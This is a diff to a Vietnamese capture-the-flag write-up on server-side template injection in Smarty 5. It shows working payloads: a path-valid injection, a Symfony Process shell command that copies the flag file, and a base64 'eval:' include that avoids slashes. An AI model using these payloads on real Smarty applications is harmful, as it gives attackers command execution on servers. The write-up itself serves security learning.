@@ -20,7 +20,7 @@ Status: Not started
 ## Summary
 
 <Callout type="note" title="Note">
-💡
+💡 SSTI in Smarty via cached templates and Symfony Process.
 
 </Callout>
 
@@ -28,34 +28,36 @@ Status: Not started
 
 ## Analyst
 
-- Mỗi khi ta gửi lên server một param pages tồn tại thì phía server sẽ tạo ra 1 file trong templates_c bao gồm cả param ta truyền pages
+- Mỗi khi ta gửi lên server một param `pages` tồn tại thì phía server sẽ tạo ra 1 file trong `templates_c` bao gồm cả param `pages` ta truyền.
+
   ![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image.png)
-- Từ đó ý tưởng của ta truyền vào payload ssti mà vẫn đc path valid
+
+- Từ đó ý tưởng là truyền vào payload SSTI mà vẫn được path valid:
 
 ```python
 {7*7}/../home
 ```
 
-- Giờ ta đã có thể ssti tuy nhiên bài này dùng smary 5 do đó k còn system thêm nữa ở bài này tác giả require cả symfony mà k bt để làm gì
+- Giờ ta đã có thể SSTI. Tuy nhiên bài này dùng Smarty 5 nên không còn `system`. Ngoài ra tác giả require cả Symfony (ban đầu chưa rõ dùng để làm gì).
 
 ![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-1.png)
 
-- Do đó ta có thể từ symfony để SSTI
-- Đọc qua doc của symfony https://symfony.com/doc/current/components/process.html
-- ta có thể ssti với command như sau:
+- Do đó ta có thể dùng Symfony để SSTI.
+- Đọc doc của Symfony Process: https://symfony.com/doc/current/components/process.html
+- Ta có thể SSTI với command như sau:
 
 ```python
 {Symfony\Component\Process\Process::fromShellCommandline("cat /flag* > x0n1l.txt")->run()}
 ```
 
-- Add vào path thì k được do slash tuy nhiên nếu đọc ở phần template của smarty 5 ta có thể gọi thông qua include file https://smarty-php.github.io/smarty/stable/api/resources/#templates-from-a-specific-directory
-- Từ đó ta có payload như sau :
+- Add vào path thì không được do slash. Tuy nhiên nếu đọc phần template của Smarty 5 ta có thể gọi thông qua include file: https://smarty-php.github.io/smarty/stable/api/resources/#templates-from-a-specific-directory
+- Từ đó payload:
 
 ```python
 {include file="eval:base64:e1N5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUHJvY2Vzczo6ZnJvbVNoZWxsQ29tbWFuZGxpbmUoImNhdCAvZmxhZyogPiB4MG4xbC50eHQiKS0%2BcnVuKCl9"}
 ```
 
-- Thành công ghi flag ra file và lấy flag
+- Thành công ghi flag ra file và lấy flag.
 
 ![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-2.png)
 
